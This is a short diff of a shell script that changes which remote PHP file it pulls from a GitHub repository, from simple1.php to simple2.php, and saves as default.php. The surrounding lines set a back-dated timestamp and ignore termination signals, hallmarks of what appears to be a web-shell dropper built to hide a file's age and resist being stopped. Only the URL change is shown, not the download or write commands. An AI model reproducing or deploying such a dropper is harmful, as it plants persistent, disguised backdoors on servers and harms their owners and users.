@@ -2,7 +2,7 @@
 PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
 DIR="$(cd "$(dirname "$0")" && pwd)"
 file_name="$DIR/default.php"
-url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/simple1.php"
+url="https://raw.githubusercontent.com/onlyme1d/dxerror/refs/heads/main/simple2.php"
 timestamp="201201081531.12"
 
 trap '' SIGTERM SIGINT SIGHUP
